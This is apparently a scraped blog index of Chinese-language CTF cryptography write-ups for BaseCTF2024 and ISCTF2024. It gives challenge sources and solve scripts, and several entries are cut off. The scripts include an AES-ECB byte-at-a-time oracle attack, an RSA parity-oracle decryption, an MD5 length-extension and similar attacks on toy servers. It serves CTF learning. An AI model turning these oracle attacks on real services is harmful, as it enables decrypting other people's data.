这里我用GPT生成了一份md5加密代码，在加密时传送进去IV值，最重要的是，我这份源码是原始的md5加密代码，我们需要在”任意内容“前填上64bytes*分组数，而且在加密函数(my_md5)中，我们只要最后一个分组的结果，所以我们需要跳过前面几个分组（在代码中skip变量处体现） exp from pwn import * import struct import math # 定义MD5所需的常量 T = [int(4294967296 * abs(math.sin(i + 1))) \u0026 0xFFFFFFFF for i in range(64)] # 定义左旋转函数 def left_rotate(x, c): return (x \u003c\u003c c) | (x \u003e\u003e (32 - c)) # 定义MD5主循环所需的四个基本函数 def F(x, y, z): return (x \u0026 y) | (~x \u0026 z) def G(x, y, z): return (x \u0026 z) | (y \u0026 ~z) def H(x, y, z): return x ^ y ^ z def I(x, y, z): return y ^ (x | ~z) # 定义MD5算法 def my_md5(message, A, B, C, D, skip): # 初始化变量 a, b, c, d = A, B, C, D # 填充消息 original_length = len(message) * 8 message += b'\\x80' while (len(message) * 8) % 512 != 448: message += b'\\x00' message += struct.pack('\u003cQ', original_length) # 处理每个512位（64字节）块 # 跳过前几个分组 for i in range(64 * skip, len(message), 64): block = message[i:i + 64] X = struct.unpack('\u003c16I', block) # 备份当前的a, b, c, d值 AA, BB, CC, DD = a, b, c, d # 进行四轮操作，每轮16步 for i in range(64): if 0 \u003c= i \u003c= 15: k, s, func = i, [7, 12, 17, 22][i % 4], F(b, c, d) elif 16 \u003c= i \u003c= 31: k, s, func = (5 * i + 1) % 16, [5, 9, 14, 20][i % 4], G(b, c, d) elif 32 \u003c= i \u003c= 47: k, s, func = (3 * i + 5) % 16, [4, 11, 16, 23][i % 4], H(b, c, d) elif 48 \u003c= i \u003c= 63: k, s, func = (7 * i) % 16, [6, 10, 15, 21][i % 4], I(b, c, d) temp = b + left_rotate((a + func + X[k] + T[i]) \u0026 0xFFFFFFFF, s) a, b, c, d = d, temp \u0026 0xFFFFFFFF, b, c # 将结果加到当前的a, b, c, d a = (a + AA) \u0026 0xFFFFFFFF b = (b + BB) \u0026 0xFFFFFFFF c = (c + CC) \u0026 0xFFFFFFFF d = (d + DD) \u0026 0xFFFFFFFF # 返回哈希结果 return struct.","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:4:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"Fin ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"の歪来 task from Crypto.Util.number import * from gmpy2 import * flag=b'' assert len(flag)==28 m=bytes_to_long(flag) n=getPrime(2048) e=32 c=pow(m,e,n) print(\"n =\",n) print(\"e =\",e) print(\"c =\",c) 思路：AMM exp n = 17363249226879909675667629533972233798566313669420563155296918020175446973456428454735263489044575257132690882883587342817653451483222705760704890265900885255972067349104579938808591608382992680533327518070878297438339884996059309549300942570104747348751766711833983705979880714174709047335147739991850385244159235504375559144283494800573079055547597410783559965162216203307100248001158445665271438067670522510991047688414176659907164436539491205637933681658814267567385232097679554282863595183422504494357205180093828786415060565003183966959273253039416986816444073158723191290806413175478175738266995214965220231649 e = 32 c = 6840453756562205147103219479843999687625029691496635689045074720240615321966887831642035124198445485320265097191334720798522097422084141332044111764558336174743819347952914775206809737198058220362381349481027893609144697054465070779290329222696236671374412706789862193871687821041053566873553189148668599841084370137084893575567622972476409755187388121177923217208552049876944055745912987536390075417261016809335539362984984190264791744790640858201038207982043569204062714722892105134794280417020318408200038144689432974312283915592134911446185412636709207566063730723406969727969141426530341540330398465744403597273 from Crypto.Util.number import * import gmpy2 import time import random def AMM(o, r, q): start = time.time() print('\\n----------------------------------------------------------------------------------') print('Start to run Adleman-Manders-Miller Root Extraction Method') print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print('[+] Find p:{}'.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print('[+] Find s:{}, t:{}'.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print('[+] Find alp:{}'.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print('[+] Calculating DLP...') j = - discrete_log(a, d) print('[+] Finish DLP...') b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(\"Finished in {} seconds.\".format(end - start)) print('Find one solution: {}'.format(result)) return result def findAllPRoot(p, e): print(\"Start to find all the Primitive {:#x}th root of 1 modulo {}.\".format(e, p)) start = time.time() proot = set() while len(proot) \u003c e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return proot def findAllSolutions(mp, proot, cp, p): print(\"Start to find all the {:#x}th root of {} modulo {}.\".format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return all_mp mp = AMM(c,e,n) p_proot = findAllPRoot(n, e) mps = findAllSolutions(mp, p_proot, c, n) for i in mps: flag = long_to_bytes(int(i)) if b'BaseCTF{' in flag: print(flag) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:1","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"ECB是不安全的 task from Crypto.Util.number import * from Crypto.Util.Padding import * from Crypto.Cipher import AES import socketserver import os import base64 flag = os.getenv('GZCTF_FLAG').encode() class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def handle(self): self.send(b\"the server will connect you entered to the front of flag.\") self.send(b\"then you will receive ciphertext(b64encode) encrypted by AES-ECB.\") key=os.urandom(16) my_aes=AES.new(key=key,mode=AES.MODE_ECB) self.send(base64.b64encode(my_aes.encrypt(pad(flag,AES.block_size)))) while True: self.send(b':') cin=self.recv() final=cin+flag self.send(base64.b64encode(my_aes.encrypt(pad(final,AES.block_size)))) self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 思路：ECB模式中，算法对每一个分组进行加密，与前后分组无关，当密钥固定之后，只要这一个分组的明文相同，那么加密之后的密文也相同。 比如flag是BaseCTF{0123456789}，长度为19.一开始服务器给我们发送密文（base64解密之后）为32字节，为两个AES-ECB分组。我们给服务器依次发送1-16字节的数据，发送一个1字节时，服务器加密20字节，最后密文还是32字节；当发送14字节时，服务器加密33字节，最后密文为48字节，发生了变化，在这时，我们就可以计算出flag长度为32-(14-1)=19。 exp from pwn import * from Crypto.Util.number import * import base64 p=remote() print(p.recvline()) print(p.recvline()) c=p.recvline()[:-1] c=base64.b64decode(c) length1=0 for i in range(16): p.recvline() # b\":\\n\" payload=b'a'*i p.sendline(payload) d=p.recvline()[:-1] d=base64.b64decode(d) if len(d)!=len(c): length1=i break length_flag=len(c)-length1 print(length_flag) # 从前往后爆破flag payload_length=len(c)+16 # 多一个分组保容错 flag=b'' for i in range(payload_length-1,payload_length-1-length_flag,-1): p.recvline() # b\":\\n\" payload=b'a'*i p.sendline(payload) d=p.recvline()[:-1] d=base64.b64decode(d) for j in range(33,128): p.recvline() # b\":\\n\" payload1=b'a'*i+flag+chr(j).encode() p.sendline(payload1) e=p.recvline()[:-1] e=base64.b64decode(e) e=e[payload_length-16:payload_length] if e in d: flag+=chr(j).encode() break print(flag) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"猜猜看 task from Crypto.Util.number import * import socketserver import numpy as np import random import ast import os flag = os.getenv('GZCTF_FLAG').encode() class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def handle(self): assert len(flag)==45 self.send(b\"hello.\") m=bytes_to_long(flag) m=bin(m)[2:] length=len(m) x=np.array([int(i) for i in m]) T=np.array([[random.getrandbits(1) for _ in range(length)] for __ in range(length)]) y=np.dot(x,T) self.send(str(list(y)).encode()) while True: user_input=ast.literal_eval(self.recv().strip().decode('utf-8')) if isinstance(user_input,list): try: mat=np.array(user_input) res=list(np.dot(mat,T)) self.send(str(res).encode()) except: self.send(b'wrong!!') else: self.send(b'wrong!') break self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 思路：利用矩阵乘法的性质，一个矩阵只有一个1，其他都是零，当他是左乘时就可以得到右乘矩阵的一行 exp import numpy as np from Crypto.Util.number import * from pwn import * p=remote() p.recvline() flag=eval(p.recvline()) length=45*8-1 T=[] for i in range(length): x=[0]*i+[1]+[0]*(length-1-i) p.sendline(str(x).encode()) T.append(eval(p.recvline())) T=np.array(T) t_ni=np.linalg.inv(T) m=np.dot(flag,t_ni) m=np.round(m) flag=\"\" for i in m: if i==1: flag+='1' else: flag+='0' print(long_to_bytes(int(flag,2))) p.interactive() ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"老涩批了 task from Crypto.Util.number import * import socketserver import os import uuid flag = os.getenv('GZCTF_FLAG').encode() class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def handle(self): p=getPrime(256) q=getPrime(256) n=p*q e=65537 d=inverse(e,(p-1)*(q-1)) text=b'BaseCTF{'+str(uuid.uuid4()).encode()+b'}' m1=bytes_to_long(text[:len(text)//2]) c1=pow(m1,e,n) m2=bytes_to_long(text[len(text)//2:]) c2=pow(m2,e,n) self.send(b'n = '+str(n).encode()) self.send(b'e = '+str(e).encode()) self.send(b'c1 = '+str(c1).encode()) self.send(b'c2 = '+str(c2).encode()) while True: select=self.recv().strip() if select==b'1': c=int(self.recv().decode().strip()) m=pow(c,d,n) res=m\u00261 elif select==b'2': c=int(self.recv().decode().strip()) m=pow(c,d,n) res=long_to_bytes(m,64)[0] elif select==b'3': user_text=self.recv().strip() if user_text==text: self.send(flag) break else: self.send(b'try again') break else : self.send(b'wrong') break self.send(str(res).encode()) self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 思路：不太会，再学学 exp from Crypto.Util.number import * import decimal from pwn import * from time import * rem=remote() rem.recvuntil(b'n = ') n=int(rem.recvline().decode().strip()) rem.recvuntil(b'e = ') e=int(rem.recvline().decode().strip()) rem.recvuntil(b'c1 = ') c1=int(rem.recvline().decode().strip()) rem.recvuntil(b'c2 = ') c2=int(rem.recvline().decode().strip()) def server_decode1(c): rem.sendline(b'1') sleep(0.01) rem.sendline(str(c).encode()) rec=rem.recvline().strip() return rec kbits = n.bit_length() decimal.getcontext().prec = kbits L = decimal.Decimal(0) R = decimal.Decimal(int(n)) for i in range(kbits): c1 = (c1 * pow(2, e, n)) % n recv = server_decode1(c1) if recv == b'1': L = (L + R) // 2 else: R = (L + R) // 2 flag1=long_to_bytes(int((R))) print(flag1) sleep(0.01) def server_decode2(c): rem.sendline(b'2') sleep(0.01) rem.sendline(str(c).encode()) rec=rem.recvline().strip() return rec k=1 while True: c22 = (c2 * pow(2, e*k, n)) % n res=server_decode2(c22) res=int(res) if res\u00261: break k=k+1 L=2**(k-1) R=2**k while True: if R-L==1: break x=(L+R)//2 c22 = (c2 * pow(x, e, n)) % n res=server_decode2(c22) res=int(res) if res: R=x else : L=x flag2=(2**(kbits-8)//L) print(long_to_bytes(flag2)) user_text=flag1[:-1]+b'-'+long_to_bytes(flag2) print(user_text) rem.sendline(b'3') sleep(0.01) rem.sendline(user_text) rem.interactive() ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:4","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"PDP task from Crypto.Util.number import * from gmpy2 import * import hashlib import hmac from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import * def KeyGen(): while True: pp=getPrime(512) p=2*pp+1 while not isPrime(p): pp=getPrime(512) p=2*pp+1 qq=getPrime(512) q=2*qq+1 while not isPrime(q): qq=getPrime(512) q=2*qq+1 if pp!=qq: break n=p*q phi=(p-1)*(q-1) e=getPrime(1024) d=invert(e,phi) v=getRandomNBitInteger(128) g=e**2%n return (n,g,e,d,v) def TagBlock(n,g,d,v): f=open(\"ABigFile\",'rb') F=f.read() f.close() b_size=64 # 64B block_count=len(F)//b_size + (0 if len(F)%b_size==0 else 1) W=[] tags=[] for i in range(block_count): Wi=str(v)+str(i) W.append(Wi) block=bytes_to_long(F[i*b_size:(i+1)*b_size]) my_md5=hashlib.md5() my_md5.update(Wi.encode()) tags.append(pow((int(my_md5.hexdigest(),16)*pow(g,block,n))%n,d,n)) return (W,tags) def GenProof(n,g): c=randint(400,500) k1=getRandomNBitInteger(256) k2=getRandomNBitInteger(160) s=getRandomNBitInteger(16) return (c,k1,k2,s,pow(g,s,n)) def gen_proof(n,tags,c,k1,k2,gs,judge=0): f=open(\"ABigFile\",'rb') F=f.read() f.close() b_size=64 # 64B if judge: listF=list(F) X=[] for i in range(len(F)//100): x=randint(0,len(F)-1) while listF[x]==0: x=randint(0,len(F)-1) X.append(x) listF[x]=0 F=b'' for i in listF: F+=long_to_bytes(i) block_count=len(F)//b_size + (0 if len(F)%b_size==0 else 1) T=1 temp=0 for j in range(c): my_aes=AES.new(long_to_bytes(k1),mode=AES.MODE_ECB) i=my_aes.encrypt(pad(long_to_bytes(j),AES.block_size)) i=bytes_to_long(i)%block_count my_sha256=hashlib.sha256 my_hmac=hmac.new(long_to_bytes(k2),digestmod=my_sha256) my_hmac.update(long_to_bytes(j)) a=int(my_hmac.hexdigest(),16)%n T=(T*(pow(tags[i],a,n)))%n block=bytes_to_long(F[i*b_size:(i+1)*b_size])%n temp=temp+block*a temp=pow(gs,temp,n) my_sha1=hashlib.sha1() my_sha1.update(str(temp).encode()) rho=int(my_sha1.hexdigest(),16) return (T,rho) n,g,e,d,v=KeyGen() with open(\"./output/key.txt\",'w') as file: file.write(str(n)+'\\n') file.write(str(e)+'\\n') W,tags=TagBlock(n,g,d,v) with open(\"./output/W.txt\",\"w\") as file: for i in W: file.write(str(i)) file.write('\\n') c,k1,k2,s,gs=GenProof(n,g) with open(\"./output/chal.txt\",'w') as file: file.write(str(c)+'\\n') file.write(str(k1)+'\\n') file.write(str(k2)+'\\n') file.write(str(s)+'\\n') T,rho=gen_proof(n,tags,c,k1,k2,gs) with open(\"./output/result.txt\",'w') as file: file.write(str(T)+'\\n') flag_md5=hashlib.md5() flag_md5.update(str(rho).encode()) print(b'BaseCTF{'+flag_md5.hexdigest().encode()+b'}') 思路：naby师傅的毕设，慢慢学 exp from Crypto.Util.number import * from gmpy2 import * import hashlib import hmac from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import * def CheckProff(n,e,W,c,k1,k2,s,T): tau=pow(T,e,n) block_count=len(W) for j in range(c): my_aes=AES.new(long_to_bytes(k1),mode=AES.MODE_ECB) i=my_aes.encrypt(pad(long_to_bytes(j),AES.block_size)) i=bytes_to_long(i)%block_count my_sha256=hashlib.sha256 my_hmac=hmac.new(long_to_bytes(k2),digestmod=my_sha256) my_hmac.update(long_to_bytes(j)) a=int(my_hmac.hexdigest(),16)%n Wi=str(W[i]) my_md5=hashlib.md5() my_md5.update(Wi.encode()) hw=pow(int(my_md5.hexdigest(),16),a,n) tau=(tau*invert(hw,n))%n tau=pow(tau,s,n) my_sha1=hashlib.sha1() my_sha1.update(str(tau).encode()) tau=int(my_sha1.hexdigest(),16) flag_md5=hashlib.md5() flag_md5.update(str(tau).encode()) print(b'BaseCTF{'+flag_md5.hexdigest().encode()+b'}') with open(\"./output/key.txt\",'r') as file: n=int(file.readline()) e=int(file.readline()) W=[] with open(\"./output/W.txt\",\"r\") as file: fl=file.readline() while fl: W.append(int(fl)) fl=file.readline() with open(\"./output/chal.txt\",'r') as file: c=int(file.readline()) k1=int(file.readline()) k2=int(file.readline()) s=int(file.readline()) T=234286400251524464112670458144913694525518333434039777508421611102466502545441606446799021254782625175811569624228349681696143431027926557585053651139957429856785510525021542033961575674601192776283321921860155347475439442726331189839563865","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:5","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"总结 最后几周在写uctf什么的，就没有写完，最后两题是真的不会，新生赛但是很精彩，新生也都很强，感觉自己还是不够努力，只能继续加油。 ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:6:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"前言 本来以为社会组没有奖，就只写了crypto和一部分misc，结果结束了又说前十有奖，呜呜呜 ","date":"2024-12-12","objectID":"/isctf2024_crypto/:1:0","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"题目 ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:0","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"我和小蓝鲨的秘密 from PIL import Image from Crypto.Util.number import bytes_to_long, long_to_bytes import numpy as np n = 29869349657224745144762606999 e = 65537 original_image_path = \"flag.jpg\" img = Image.open(original_image_path) img = img.convert(\"RGB\") img_array = np.array(img) h, w, _ = img_array.shape encrypted_array = np.zeros((h, w, 3), dtype=object) for i in range(h): for j in range(w): r, g, b = int(img_array[i, j, 0]), int(img_array[i, j, 1]), int(img_array[i, j, 2]) encrypted_array[i, j, 0] = pow(r, e, n) encrypted_array[i, j, 1] = pow(g, e, n) encrypted_array[i, j, 2] = pow(b, e, n) np.save(\"encrypted_image.npy\", encrypted_array) print(\"图片已加密并保存为 encrypted_image.npy\") 思路：就是很简单图片rsa，可以直接，遍历，n很小，可以直接分解 exp from sympy import factorint from Crypto.Util.number import* import numpy as np from PIL import Image n = 29869349657224745144762606999 p=186431677583461 q=160216064374859 e=65537 phi = (p - 1) * (q - 1) d = inverse(e, phi) encrypted_array = np.load(\"encrypted_image.npy\", allow_pickle=True) h, w, _ = encrypted_array.shape decrypted_array = np.zeros((h, w, 3), dtype=np.uint8) for i in range(h): for j in range(w): decrypted_array[i, j, 0] = pow(encrypted_array[i, j, 0], d, n) decrypted_array[i, j, 1] = pow(encrypted_array[i, j, 1], d, n) decrypted_array[i, j, 2] = pow(encrypted_array[i, j, 2], d, n) decrypted_img = Image.fromarray(decrypted_array, 'RGB') decrypted_img.save(\"decrypted_flag.jpg\") print(\"Flag 已解密并保存为 decrypted_flag.jpg\") ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:1","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"chacha20 task from Crypto.Cipher import ChaCha20_Poly1305 import os key = os.urandom(32) nonce = os.urandom(12) with open('flag.txt', 'rb') as f: plaintext = f.read() cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce) ct, tag = cipher.encrypt_and_digest(plaintext) print(f\"Encrypted Flag: {ct.hex()}\") print(f\"Tag: {tag.hex()}\") print(f\"Nonce: {nonce.hex()}\") with open('key.txt', 'w') as key_file: key_file.write(key.hex()) key?.txt 3=t#sMX3?9GHSPdi4i^gk!3*(cH8S8XT2y\u0026?Tv4!?AGG=R]ZDy/PVVa+DqiXAH*}DS\u0026Nn*a+@\u003cH,=!L output.txt Encrypted Flag: 20408b9fc498063ad53a4abb53633a6a15df0ddaf173012d620fa33001794dbb8c038920273464e13170e26d08923aeb Tag: 70ffcc508bf4519e7616f602123c307b Nonce: d8ebeedec812a6d71240cc50 思路：chacha20反向解过去就行了，key是个base，至于多少自己试吧，因为我也是一个一个试的（气死我了） exp # python from Crypto.Cipher import ChaCha20_Poly1305 #key是base # 提供的密钥、Nonce、密文和标签 key_hex = '173974535637a5ef30a116b03d00bd2fe751951ca3eaa62daec2b8f5ca5b6135' nonce_hex = 'd8ebeedec812a6d71240cc50' ciphertext_hex = '20408b9fc498063ad53a4abb53633a6a15df0ddaf173012d620fa33001794dbb8c038920273464e13170e26d08923aeb' tag_hex = '70ffcc508bf4519e7616f602123c307b' # 转换为字节 key = bytes.fromhex(key_hex) nonce = bytes.fromhex(nonce_hex) ciphertext = bytes.fromhex(ciphertext_hex) tag = bytes.fromhex(tag_hex) # 创建解密器 cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce) try: # 解密并验证 plaintext = cipher.decrypt_and_verify(ciphertext, tag) print(\"Flag:\", plaintext.decode()) except Exception as e: print(\"解密失败:\", e) ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:2","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"基础的数学 task Base和Ciphertext m = 5321153468370294351697008906248782883193902636120413346203705810525086437271585682015110123362488732193020749380395419994982400888011862076022065339666193 c = 7383779796712259466884236308066760158536557371789388054326630574611014773044467468610300619865230550443643660647968413988480055366698747395046400909922513 思路：写的时候已经有hint了，说是mod是2**512，那么直接解就行了 exp m = 5321153468370294351697008906248782883193902636120413346203705810525086437271585682015110123362488732193020749380395419994982400888011862076022065339666193 c = 7383779796712259466884236308066760158536557371789388054326630574611014773044467468610300619865230550443643660647968413988480055366698747395046400909922513 n=2**512 from sympy import discrete_log flag=discrete_log(n,c,m) from Crypto.Util.number import long_to_bytes print(long_to_bytes(flag)) ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:3","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"小蓝鲨的密码 省略：压缩包密码就是图片的名字，不喜欢 ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:4","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"ezmath task import random import base64 from hashlib import md5 from secret import flag from libnum import s2n from Crypto.Cipher import AES INF = 0xff bigINF = 0xffffffff # ---------------------error------------------------------ def sumFunc(func): def wapper(*args,start = 1,end=INF): sums = 0 for i in trange(start, 0xffff * end): sums += function(*args,j/0xf) * (1/0xf) return sums return wapper def limitFunc(func): def wapper(*args, approch = bigINF, pos = \"+\"): o = 1/bigINF return function(args, eval(f\"{approch} {pos} {o}\")) return wapper # -------------------enderror----------------------------- def pad(data): data=data.encode('utf8') while len(data) % 16 !=0: data+=b'\\x00' return data def encode(key,m): mode=AES.MODE_ECB aes=AES.new(pad(key),mode) en_m=aes.encrypt(pad(m)) en_m=base64.encodebytes(en_m) en_m=en_m.decode('utf8') return en_m def enc(msg, key): random.seed(key) new_key = md5(str(random.getrandbits(256)).encode('utf-8')).hexdigest() return encode(new_key, msg) @sumFunc def gamma(x,t): data = pow(t,x-1) * pow(magicNumber,-t) return data @sumFunc def common(t): data = pow(magicNumber,-pow(t,2)) return data @limitFunc def getMagicNumber(t): data = pow(1+1/t,t) return data magicNumber = getMagicNumber() encKey1 = str(gamma(3/2))[2:6] encKey2 = str(common())[2:6] assert encKey1 == encKey2 key = int(str(gamma(5/2))[2:]) print(enc(flag, key)) # n2SQK64JMsXstCtZurBiz81pMr3ZmgMjhuyL67hssm3shqJGYGfS/mWubINeE5HZ 思路：代码里面是装饰器，先把代码修复一下，虽然修不修无所谓，计算gamma(5/2)的结果就行，key就是小数部分，直接求就行了 exp import random import base64 from hashlib import md5 from Crypto.Cipher import AES def pad(data): if isinstance(data, str): data = data.encode('utf8') while len(data) % 16 != 0: data += b'\\x00' return data random.seed(key) rand_bits = random.getrandbits(256) new_key = md5(str(rand_bits).encode('utf-8')).hexdigest() return new_key def decode(key, en_m): new_key = compute_new_key(key) print(f\"New Key: {new_key}\") aes = AES.new(pad(new_key), AES.MODE_ECB) en_m_bytes = base64.decodebytes(en_m.encode('utf8')) de_m = aes.decrypt(en_m_bytes) try: return de_m.rstrip(b'\\x00').decode('utf8') except UnicodeDecodeError: print(\"解密后的字节无法以UTF-8解码。\") return de_m.rstrip(b'\\x00') encrypted_flag = \"n2SQK64JMsXstCtZurBiz81pMr3ZmgMjhuyL67hssm3shqJGYGfS/mWubINeE5HZ\" key_str = \"1.329340388179137\" key = int(key_str.split('.')[1]) print(f\"Computed Key: {key}\") flag = decode(key, encrypted_flag) print(f\"Flag = {flag}\") ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:5","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"fermat task import libnum import gmpy2 from Crypto.Util.number import * flag=b'ISCTF{********}' m=bytes_to_long(flag) p=libnum.generate_prime(1024) q=libnum.generate_prime(1024) n=p*q e=0x10001 c=pow(m,e,n) d=inverse(e,(p-1)*(q-1)) leak = (d+(pow(p,q,n)+pow(q,p,n)))%n print(\"c=\", c) print(\"n=\", n) print(\"leak=\", leak) \"\"\" c= 8989289659072309605793417141528767265266446236550650613514493589798432446586991233583435051268377555448062724563967695425657559568596372723980081067589103919296476501677424322525079257328042851349095575718347302884996529329066703597604694781627113384086536158793653551546025090807063130353950841148535682974762381044510423210397947080397718080033363000599995100765708244828566873128882878164321817156170983773105693537799111546309755235573342169431295776881832991533489235535981382958295960435126843833532716436804949502318851112378495533302256759494573250596802016112398817816155228378089079806308296705261876583997 n= 13424018200035368603483071894166480724482952594135293395398366121467209427078817227870501294732149372214083432516059795712917132804111155585926502759533393295089100965059106772393520277313184519450478832376508528256865861027444446718552169503579478134286009893965458507369983396982525906466073384013443851551139147777507283791250268462136554061959016630318688169168797939873600493494258467352326974238472394214986505312411729432927489878418792288365594455065912126527908319239444514857325441614280498882524432151918146061570116187524918358453036228204087993064505391742062288050068745930452767100091519798860487150247 leak= 9192002086528025412361053058922669469031188193149143635074798633855112230489479254740324032262690315813650428270911079121913869290893574897752990491429582640499542165616254566396564016734157323265631446079744216458719690853526969359930225042993006404843355356540487296896949431969541367144841985153231095140361069256753593550199420993461786814074270171257117410848796614931926182811404655619662690700351986753661502438299236428991412206196135090756862851230228396476709412020941670878645924203989895008014836619321109848938770269989596541278600166088022166386213646074764712810133558692545401032391239330088256431881 \"\"\" 思路：很经典的题目，风二西佬好像讲过，可以直接去看，所以咱们就不写了（懒 exp import gmpy2 from Crypto.Util.number import long_to_bytes, inverse import libnum # 给定的值 c = 8989289659072309605793417141528767265266446236550650613514493589798432446586991233583435051268377555448062724563967695425657559568596372723980081067589103919296476501677424322525079257328042851349095575718347302884996529329066703597604694781627113384086536158793653551546025090807063130353950841148535682974762381044510423210397947080397718080033363000599995100765708244828566873128882878164321817156170983773105693537799111546309755235573342169431295776881832991533489235535981382958295960435126843833532716436804949502318851112378495533302256759494573250596802016112398817816155228378089079806308296705261876583997 n = 13424018200035368603483071894166480724482952594135293395398366121467209427078817227870501294732149372214083432516059795712917132804111155585926502759533393295089100965059106772393520277313184519450478832376508528256865861027444446718552169503579478134286009893965458507369983396982525906466073384013443851551139147777507283791250268462136554061959016630318688169168797939873600493494258467352326974238472394214986505312411729432927489878418792288365594455065912126527908319239444514857325441614280498882524432151918146061570116187524918358453036228204087993064505391742062288050068745930452767100091519798860487150247 leak = 919200208652802541236105305892266946903118819314914363507479863385511223048947925474032403226269031581365042827091107912191386929089357489775299049142958264049954216561625456639656401673415732326563144607974421645871969085352696935993022504299300640484335535654048729689694943196954136714484198515323109514036106925675359355019942099346178681407427017125711741084879661493192618281140465561966269070035198675366150243829923642899","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:6","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"蓝鲨的RSA task from secret import flag import gmpy2 import decimal from Crypto.Util.number import * def gethint(h,p): decimal.getcontext().prec = 1024 H = decimal.Decimal(int(h)) P = decimal.Decimal(int(p)) leak = decimal.Decimal((8*H*P - 1) / (16*P*P)) return leak p = getPrime(512) q = getPrime(512) f = getPrime(512) g = getPrime(128) h = gmpy2.invert(f, p) * g % p n = f*q e = 65537 m = bytes_to_long(flag) c = pow(m,e,n) print('c =', c) print('hint =', 